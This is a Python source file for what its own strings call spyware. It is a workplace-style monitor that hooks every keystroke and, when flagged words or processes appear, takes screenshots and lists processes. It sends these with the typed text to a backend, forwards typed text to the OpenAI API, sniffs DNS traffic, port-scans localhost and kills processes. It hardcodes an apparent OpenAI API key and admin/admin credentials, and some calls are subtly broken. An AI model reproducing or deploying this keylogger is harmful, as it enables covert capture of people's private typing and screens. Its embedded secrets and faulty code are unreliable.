import time
import threading
import keyboard
from PIL import ImageGrab
import base64
import requests
import json
import psutil
from scapy.layers.dns import DNS
from scapy.all import *
import socket
from IPy import IP
import openai
from getmac import get_mac_address

class Keylogger:
    def __init__(self):
        self.log = ""

    def callback(self, event):
        if event.name == "enter":
            self.report()
        elif event.name == "space":
            self.log += " "
        elif event.name == "backspace":
            self.log = self.log[:-1]
        elif event.name == "caps lock":
            pass  # ignore caps lock key
        else:
            char = event.name
            if event.name.startswith("shift"):
                char = self.get_shift_chars().get(event.name, "")
            self.log += char

    def get_shift_chars(self):
        return {
            "shift + 1": "!",
            "shift + 2": "@",
            "shift + 3": "#",
            "shift + 4": "$",
            "shift + 5": "%",
            "shift + 6": "^",
            "shift + 7": "&",
            "shift + 8": "*",
            "shift + 9": "(",
            "shift + 0": ")",
            "shift + -": "_",
            "shift + =": "+",
            "shift + [": "{",
            "shift + ]": "}",
            "shift + ;": ":",
            "shift + '": "\"",
            "shift + ,": "<",
            "shift + .": ">",
            "shift + /": "?",
            "shift + `": "~",
            "shift + \\": "|",
        }

    def report(self):
        alert_json = self.is_hate_speech()
        if self.log and (alert_json or self.is_bad_language() or self.are_malicious_process() or self.verify_hate_speech_chatGPT(self.log)):
            logging("Foi enviado o report!")
            send_alert(self.log, alert_json)
        self.log = ""

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def is_hate_speech(self):
        data_logs = json.dumps({"value": 0, "frase": self.log})
        headers = {'Content-type': 'application/json'}
        try:
            hate_speech = requests.post("http://127.0.0.1:5000/predict", data=data_logs, headers=headers)
            hate_speech_json = json.loads(hate_speech.content)
            alert_json = hate_speech_json
            if hate_speech_json['value'] == 1:
                logging("Geração de alerta por discurso de ódio: " + self.log)
                logging(str(hate_speech_json))
                return alert_json
        except Exception as e:
            logging("Error to communicate with spyware API Gateway: " + str(e))
        return False

    def is_bad_language(self):
        log_tokenized = self.log.split()
        with open(r'C:\keyLogger\badLanguage.txt', encoding="utf8") as file:
            contents = file.read().split(';')
            for word in log_tokenized:
                if word.lower() in contents or word.upper() in contents or word in contents:
                    logging("Palavra que gerou o alerta:" + word.lower() + "\n")
                    return True

    def are_malicious_process(self):
        with open(r'C:\keyLogger\maliciousProcess.txt', encoding="utf8") as file:
            contents = file.read().split(';')
            for proc in psutil.process_iter(attrs=['name']):
                if proc.info['name'].lower() in contents:
                    try:
                        proc.kill()
                    except Exception as e:
                        logging("Error to Kill the process " + proc.info['name'] + ": " + str(e))
                        return False
                    logging("Alerta gerado por causa do processo: " + proc.info['name'] + "\n")
                    self.log = "Alerta gerado por causa do processo: " + proc.info['name']
                    return True

    def verify_hate_speech_chatGPT(self, text):
        try:
            openai.api_key = "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"
            response = openai.Completion.create(
                model="text-davinci-003",
                prompt='Identifique se essa frase tem discurso de ódio: "' + text + '". Responda com sim ou não',
                temperature=0.6,
            )
            if response.choices[0].text.lower().find("sim") == 0:
                logging("Hate speech by GPT 3: " + text)
                return True
        except Exception as e:
            logging("ChatGPT is off: " + str(e))
        return False

class Scanner(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.ports = []
        self.banners = []
        self.log = ''

    def banner(self, s):
        return s.recv(1024)

    def port_scanner(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            try:
                target_ip = IP(target)
            except:
                target_ip = socket.gethostbyname(target)
            s.connect((target_ip, port))
            try:
                banner_name = self.banner(s).decode()
                self.ports.append(port)
                self.banners.append(banner_name.strip())
            except:
                pass
        except:
            pass

    def run(self):
        logging("Iniciou o Scanner!")
        for port in range(1, 5051):
            while threading.active_count() > 150:
                time.sleep(0.01)
            thread = threading.Thread(target=self.port_scanner, args=("localhost", port))
            thread.start()
        with open(r"C:\keyLogger\vulnerable_banners.txt", "r") as file:
            data = file.read()
            for i in range(len(self.banners)):
                if self.banners[i] in data:
                    self.log = f"[!] Vulnerability found: {self.banners[i]} at port {self.ports[i]}"
                    logging(self.log)
                    send_alert(self.log)
        logging("Terminou o Scanner")

def update_aux_data():
    headers = do_login()
    logging("Iniciou a atualização dos dados auxiliares!")
    try:
        bad_language_response = requests.get("http://localhost:9000/language?page=1&size=1000&sortBy=id", headers=headers)
        if bad_language_response.status_code == 204:
            logging("There's no bad language")
        else:
            bad_languages = bad_language_response.json()
            with open(r"C:\keyLogger\badLanguage.txt", "w") as file:
                for bad_language in bad_languages:
                    file.write(bad_language.get('word') + ";")

        ports_response = requests.get("http://localhost:9000/port?page=1&size=1000&sortBy=id", headers=headers)
        if ports_response.status_code == 204:
            logging("There's no ports")
        else:
            ports = ports_response.json()
            with open(r"C:\keyLogger\vulnerable_banners.txt", "w") as file:
                for port in ports:
                    file.write(port.get('vulnerableBanners') + ";")

        processes_response = requests.get("http://localhost:9000/process?page=1&size=1000&sortBy=id", headers=headers)
        if processes_response.status_code == 204:
            logging("There's no processes")
        else:
            processes = processes_response.json()
            with open(r"C:\keyLogger\maliciousProcess.txt", "w") as file:
                for process in processes:
                    file.write(process.get('nameExe') + ";")

        websites_response = requests.get("http://localhost:9000/website?page=1&size=1000&sortBy=id", headers=headers)
        if websites_response.status_code == 204:
            logging("There's no websites")
        else:
            websites = websites_response.json()
            with open(r"C:\keyLogger\sites.txt", "w") as file:
                for website in websites:
                    file.write(website.get('url') + ";")
    except Exception as ex:
        logging("Error to update the auxiliary data: " + str(ex))

def send_alert(log, alert_json):
    headers = do_login()
    try:
        data_alert = json.dumps({"log": log, "pcId": str(get_mac_address()), "image": get_image(),
                                "processes": get_process(), "models": alert_json['models'],
                                "language": alert_json['language'], "company": {"companyId": COMPANY}},
                               sort_keys=True, indent=4)
        alert = requests.post("http://localhost:9000/alert", data_alert, headers=headers)
        logging("Alert Saved!\n" + str(alert) + "\n")
        print("Alert Saved")
        time.sleep(10)
    except Exception as error:
        logging("Error to send Alert\n" + str(error))

class Sniffer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.blocked_sites = set(self.read_blocked_sites())
        self.logs = []
        self.queries = set()
        self.packet_count = 0
        self.max_packet_count = 1000
        self.capture_interval = 0.01
        self.capture_active = True
        self.lock = threading.Lock()

    def read_blocked_sites(self):
        with open(r'C:\keyLogger\sites.txt') as file:
            return {line.strip() for line in file}

    def sniffer(self, pkt):
        if DNS in pkt and pkt.haslayer(Raw):
            src_port = pkt.sport
            if src_port in {80, 443, 8080}:
                query = pkt[DNS].qd.qname.decode("utf-8") if pkt[DNS].qd is not None else "?"
                query = query.rstrip('.')
                if query in self.blocked_sites and query not in self.queries:
                    log = "Alerta gerado pelo seguinte DNS: " + query
                    with self.lock:
                        self.logs.append(log)
                        if len(self.logs) > 100:
                            self.logs = self.logs[-100:]
                        send_alert(log)
                        self.queries.add(query)

    def run(self):
        logging("Iniciou do sniffer!")
        sniff(filter="(udp port 53) or (tcp port 80) or (tcp port 443) or (tcp port 8080)",
              prn=self.process_packet, count=self.max_packet_count, timeout=self.capture_interval)

    def process_packet(self, pkt):
        self.sniffer(pkt)
        with self.lock:
            self.packet_count += 1
            if self.packet_count >= self.max_packet_count:
                self.capture_active = False

def get_process():
    info_set = set()
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        info = proc.info
        info_set.add(info['name'])
    process = ''
    for t in info_set:
        process = process + t + ','
    return process

def get_image():
    buffer = io.BytesIO()
    image = ImageGrab.grab()
    image.save(buffer, format='png')
    image.close()
    b64_bytes = base64.b64encode(buffer.getvalue())
    b64_str = b64_bytes.decode('utf-8')
    return b64_str

def do_login():
    client = requests.Session()
    username = "admin"
    password = "admin"
    form_data = {
        "username": username,
        "password": password,
        "grant_type": "password",
    }
    response = client.post("http://localhost:8180/realms/quarkus1/protocol/openid-connect/token",
                           auth=("backend-service", "secret"),
                           headers={"Content-Type": "application/x-www-form-urlencoded"},
                           data=form_data)
    if response.status_code != 200:
        error_message = f"Failed to login. Status: {response.status_code}"
        raise Exception(error_message)
    print(response.status_code)
    response_json = response.json()
    token = response_json.get("access_token")
    if not token:
        logging("Invalid Token")
    return {
        'Authorization': 'Bearer ' + token,
        'Content-type': 'application/json'
    }

def logging(text):
    print(text)
    arquivo = open(r'C:\keyLogger\logs\logs_' + str(time.monotonic_ns()) + '.txt', 'a')
    arquivo.writelines(str(time.ctime()) + "    " + text + "\n")
    arquivo.close()

COMPANY = 1

if __name__ == "__main__":
    try:
        logging("Begin!")
        update_aux_data()
        Scanner().start()
        Sniffer().start()
        logging("Begin KeyLogger!")
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        logging(str(e))
        input("Enter to leave...")
